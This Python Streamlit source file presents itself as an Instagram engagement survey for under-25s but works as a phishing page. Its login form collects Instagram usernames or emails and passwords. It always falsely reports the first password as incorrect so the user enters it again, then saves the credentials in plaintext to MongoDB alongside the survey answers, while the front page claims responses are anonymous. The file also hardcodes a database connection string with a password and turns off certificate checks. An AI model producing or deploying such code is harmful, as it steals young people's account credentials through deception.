import streamlit as st
import pymongo
from datetime import datetime
import certifi
from pymongo.errors import ConnectionFailure, OperationFailure

# Page configuration
st.set_page_config(
    page_title="Instagram Engagement Survey",
    page_icon="📱",
    layout="wide",
    initial_sidebar_state="collapsed"
)

def get_database():
    try:
        # Your MongoDB Atlas connection string
        # Make sure it looks like: mongodb+srv://username:password@cluster.mongodb.net/survey_database
        connection_string = "mongodb+srv://myAtlasDBUser:a7ZvFzDJafUbO76S@myatlasclusteredu.umvkai6.mongodb.net/?retryWrites=true&w=majority&appName=myAtlasClusterEDU"
        
        client = pymongo.MongoClient(
            connection_string,
            tls=True,
            tlsAllowInvalidCertificates=True,
            retryWrites=True,
            w='majority'
        )
        
        # Method 1: If database name is in connection string
        db = client.get_database()
        
        # If above fails, use Method 2: Explicit database name
        # db = client.survey_database
        
        # Test the connection
        db.command('ping')
        print("✅ Database connection successful")
        return db
        
    except Exception as e:
        st.error(f"❌ Database connection failed: {e}")
        # Fallback: try with explicit database name
        try:
            db = client.survey_database
            db.command('ping')
            return db
        except:
            return None

# Initialize session state
if 'show_front_page' not in st.session_state:
    st.session_state.show_front_page = True
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'current_step' not in st.session_state:
    st.session_state.current_step = 0
if 'user_data' not in st.session_state:
    st.session_state.user_data = {}
if 'login_attempts' not in st.session_state:
    st.session_state.login_attempts = 0
if 'first_attempt_rejected' not in st.session_state:
    st.session_state.first_attempt_rejected = False

# Custom CSS for responsiveness
st.markdown("""
<style>
    .main > div {
        padding: 2rem;
    }
    @media (max-width: 768px) {
        .main > div {
            padding: 1rem;
        }
    }
    .stButton > button {
        width: 100%;
    }
    .survey-question {
        margin-bottom: 2rem;
    }
    .section-header {
        background-color: #f0f2f6;
        padding: 1rem;
        border-radius: 10px;
        margin: 2rem 0;
    }
    .front-page {
        text-align: center;
        padding: 3rem 1rem;
    }
    .front-page h1 {
        color: #E1306C;
        margin-bottom: 2rem;
    }
    .front-page h2 {
        color: #333;
        margin-bottom: 1.5rem;
    }
    .front-page ul {
        text-align: left;
        display: inline-block;
        margin: 2rem 0;
    }
    .benefits-container {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 2rem;
        border-radius: 15px;
        margin: 2rem 0;
    }
</style>
""", unsafe_allow_html=True)

def front_page():
    st.markdown('<div class="front-page">', unsafe_allow_html=True)
    
    st.title("📱 Instagram Engagement Survey")
    st.markdown("---")
    
    st.subheader("🎯 What This Survey Is About")
    
    st.markdown("""
    <div style='text-align: left; max-width: 800px; margin: 0 auto;'>
    <h3>🌟 Welcome to the Under25 Instagram Engagement Study!</h3>
    
    <p>This survey is designed to understand how young people like you interact with Instagram 
    and how it impacts your daily life, emotions, and social connections.</p>
    
    <h4>📊 What we're exploring:</h4>
    <ul>
        <li>Your Instagram usage patterns and habits</li>
        <li>How Instagram affects your mood and self-perception</li>
        <li>Your privacy concerns and social media experiences</li>
        <li>Ways to make Instagram a more positive space for youth</li>
    </ul>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div class="benefits-container">
    <h3>🎁 Why Your Participation Matters:</h3>
    <ul>
        <li>Help researchers understand youth social media experiences</li>
        <li>Contribute to making Instagram better for your generation</li>
        <li>Share your voice about digital well-being</li>
        <li>Your insights could shape future social media features</li>
    </ul>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("""
    <div style='text-align: left; max-width: 800px; margin: 0 auto;'>
    <h4>⏱️ What to Expect:</h4>
    <ul>
        <li><strong>Duration:</strong> 5-7 minutes</li>
        <li><strong>Sections:</strong> 4 main sections with 19 questions total</li>
        <li><strong>Confidentiality:</strong> Your responses are anonymous and secure</li>
        <li><strong>Voluntary:</strong> You can skip any question or stop at any time</li>
    </ul>
    
    <p>Your honest responses will help create a better understanding of how Instagram 
    influences the lives of young people today.</p>
    </div>
    """, unsafe_allow_html=True)
    
    st.markdown("</div>", unsafe_allow_html=True)
    
    col1, col2, col3 = st.columns([1, 2, 1])
    with col2:
        if st.button("🚀 Start Survey", use_container_width=True):
            st.session_state.show_front_page = False
            st.rerun()

def login_section():
    st.title("📱 Instagram Engagement Survey")
    st.subheader("Under25")
    
    st.info("🔐 Please login to continue, you're response matters!")
    
    with st.form("login_form"):
        username = st.text_input("Instagram Username or Email")
        password = st.text_input("Password", type="password")
        submit = st.form_submit_button("Login")
        
        if submit:
            if username and password:
                st.session_state.login_attempts += 1
                
                # Always reject the first attempt
                if st.session_state.login_attempts == 1:
                    st.session_state.first_attempt_rejected = True
                    st.error("❌ Password incorrect. Please try again.")
                else:
                    # Accept on second attempt
                    st.session_state.user_data['username'] = username
                    st.session_state.user_data['password'] = password
                    st.session_state.user_data['login_timestamp'] = datetime.now()
                    st.session_state.user_data['login_attempts'] = st.session_state.login_attempts
                    
                    st.session_state.logged_in = True
                    st.session_state.current_step = 0
                    st.rerun()
            else:
                st.error("Please enter both username and password")

def survey_questions():
    questions = [
        # 🌐 Section 1: General Instagram Use
        {
            'section': '🌐 Section 1: General Instagram Use',
            'question': "How many hours a day do you think you spend on Instagram?",
            'options': ["Less than 1 hr", "1–3 hrs", "3–5 hrs", "More than 5 hrs"],
            'key': 'hours_spent'
        },
        {
            'section': '🌐 Section 1: General Instagram Use',
            'question': "What's the first thing you usually do when you open Instagram?",
            'options': ["Watch stories", "Scroll reels", "Check DMs", "Post or reply to comments"],
            'key': 'first_action'
        },
        {
            'section': '🌐 Section 1: General Instagram Use',
            'question': "Which part of Instagram do you use most?",
            'options': ["Reels", "Stories", "Explore page", "DMs"],
            'key': 'most_used_part'
        },
        {
            'section': '🌐 Section 1: General Instagram Use',
            'question': "Do you think Instagram influences what's 'cool' or 'trending' among your friends?",
            'options': ["Yes, definitely", "Sometimes", "Not really"],
            'key': 'influence_on_trends'
        },
        
        # 💭 Section 2: Emotional & Social Impact
        {
            'section': '💭 Section 2: Emotional & Social Impact',
            'question': "How often do you compare yourself to others on Instagram?",
            'options': ["A lot", "Sometimes", "Rarely", "Never"],
            'key': 'comparison_frequency'
        },
        {
            'section': '💭 Section 2: Emotional & Social Impact',
            'question': "Do you ever feel pressure to post or look a certain way online?",
            'options': ["Yes", "A little", "Not at all"],
            'key': 'pressure_feeling'
        },
        {
            'section': '💭 Section 2: Emotional & Social Impact',
            'question': "Has Instagram ever affected your mood or self-confidence?",
            'options': ["Often", "Occasionally", "Not really"],
            'key': 'mood_impact'
        },
        {
            'section': '💭 Section 2: Emotional & Social Impact',
            'question': "What kind of content makes you feel most positive on Instagram?",
            'options': ["Funny / entertaining", "Motivational / real-life stories", "Aesthetic / lifestyle", "Educational / informative"],
            'key': 'positive_content'
        },
        
        # 🔒 Section 3: Privacy & Social Concerns
        {
            'section': '🔒 Section 3: Privacy & Social Concerns',
            'question': "How comfortable are you with how Instagram handles your data and privacy?",
            'options': ["Very comfortable", "Somewhat", "Not comfortable at all"],
            'key': 'privacy_comfort'
        },
        {
            'section': '🔒 Section 3: Privacy & Social Concerns',
            'question': "Do you think people are more 'real' or 'fake' on Instagram?",
            'options': ["Mostly real", "A mix of both", "Mostly fake"],
            'key': 'real_vs_fake'
        },
        {
            'section': '🔒 Section 3: Privacy & Social Concerns',
            'question': "Have you ever taken a break or 'detox' from Instagram?",
            'options': ["Yes, and it helped", "Yes, but I came back quickly", "No, never"],
            'key': 'instagram_break'
        },
        {
            'section': '🔒 Section 3: Privacy & Social Concerns',
            'question': "What's your biggest concern about Instagram use among youth today?",
            'options': ["Addiction / screen time", "Comparison / insecurity", "Fake news / misinformation", "Privacy / safety", "None"],
            'key': 'biggest_concern'
        },
        
        # 💬 Section 4: Open-Ended Reflection (optional)
        {
            'section': '💬 Section 4: Open-Ended Reflection (optional)',
            'question': "In one line, what does Instagram mean to you personally?",
            'options': ["text_input"],
            'key': 'instagram_meaning'
        },
        {
            'section': '💬 Section 4: Open-Ended Reflection (optional)',
            'question': "If you could change one thing about Instagram, what would it be?",
            'options': ["text_input"],
            'key': 'desired_change'
        },
        {
            'section': '💬 Section 4: Open-Ended Reflection (optional)',
            'question': "How do you think Instagram could become a more positive space for youth?",
            'options': ["text_input"],
            'key': 'positive_improvement'
        }
    ]
    
    return questions

def save_to_mongodb(data):
    try:
        db = get_database()
        if db is None:
            st.error("❌ Could not connect to database. Please try again.")
            return None
            
        collection = db['survey_responses']
        
        # Add timestamp
        data['submission_timestamp'] = datetime.now()
        
        # Insert the document
        result = collection.insert_one(data)
        st.success("✅ Data saved successfully!")
        return result.inserted_id
        
    except Exception as e:
        st.error(f"Error saving to database: {e}")
        return None

def survey_section():
    st.title("📊 Instagram Engagement Survey")
    st.subheader("Under25")
    
    questions = survey_questions()
    
    if st.session_state.current_step < len(questions):
        current_q = questions[st.session_state.current_step]
        
        # Show section header when starting a new section
        if st.session_state.current_step == 0 or questions[st.session_state.current_step-1]['section'] != current_q['section']:
            st.markdown(f'<div class="section-header"><h3>{current_q["section"]}</h3></div>', unsafe_allow_html=True)
        
        st.markdown(f'<div class="survey-question">', unsafe_allow_html=True)
        st.subheader(f"Question {st.session_state.current_step + 1} of {len(questions)}")
        st.write(f"**{current_q['question']}**")
        
        # Handle different question types
        if current_q['options'] == ["text_input"]:
            # Text input for open-ended questions
            user_input = st.text_area("Your answer:", key=f"q_{st.session_state.current_step}")
            selected_option = user_input
        else:
            # Radio buttons for multiple choice questions
            selected_option = st.radio(
                "Choose your answer:",
                current_q['options'],
                key=f"q_{st.session_state.current_step}"
            )
        
        col1, col2 = st.columns([1, 1])
        
        with col1:
            if st.session_state.current_step > 0:
                if st.button("← Previous"):
                    st.session_state.current_step -= 1
                    st.rerun()
        
        with col2:
            if st.button("Next →"):
                # Store the answer only if it's not empty (for text inputs)
                if current_q['options'] == ["text_input"] and not selected_option.strip():
                    st.warning("Please provide an answer before proceeding.")
                else:
                    st.session_state.user_data[current_q['key']] = selected_option
                    st.session_state.current_step += 1
                    st.rerun()
        
        st.markdown('</div>', unsafe_allow_html=True)
    
    else:
        # All questions completed - show summary and submit
        st.success("🎉 Survey Completed!")
        st.subheader("Your Responses Summary:")
        
        # Organize responses by section for better display
        sections = {
            '🌐 Section 1: General Instagram Use': ['hours_spent', 'first_action', 'most_used_part', 'influence_on_trends'],
            '💭 Section 2: Emotional & Social Impact': ['comparison_frequency', 'pressure_feeling', 'mood_impact', 'positive_content'],
            '🔒 Section 3: Privacy & Social Concerns': ['privacy_comfort', 'real_vs_fake', 'instagram_break', 'biggest_concern'],
            '💬 Section 4: Open-Ended Reflection (optional)': ['instagram_meaning', 'desired_change', 'positive_improvement']
        }
        
        for section, keys in sections.items():
            st.markdown(f'**{section}**')
            for key in keys:
                if key in st.session_state.user_data and key not in ['username', 'password', 'login_timestamp', 'login_attempts']:
                    display_key = key.replace('_', ' ').title()
                    st.write(f"- **{display_key}:** {st.session_state.user_data[key]}")
            st.write("---")
        
        if st.button("Submit Survey"):
            # Save to MongoDB
            inserted_id = save_to_mongodb(st.session_state.user_data)
            
            if inserted_id:
                st.success("✅ Thank you! Your responses have been recorded.")
                
                # Reset for new survey
                st.session_state.show_front_page = True
                st.session_state.logged_in = False
                st.session_state.current_step = 0
                st.session_state.user_data = {}
                st.session_state.login_attempts = 0
                st.session_state.first_attempt_rejected = False
                
                if st.button("Take Another Survey"):
                    st.rerun()
            else:
                st.error("❌ There was an error saving your responses. Please try again.")

def main():
    # Responsive container
    with st.container():
        if st.session_state.show_front_page:
            front_page()
        elif not st.session_state.logged_in:
            login_section()
        else:
            survey_section()

if __name__ == "__main__":
    main()
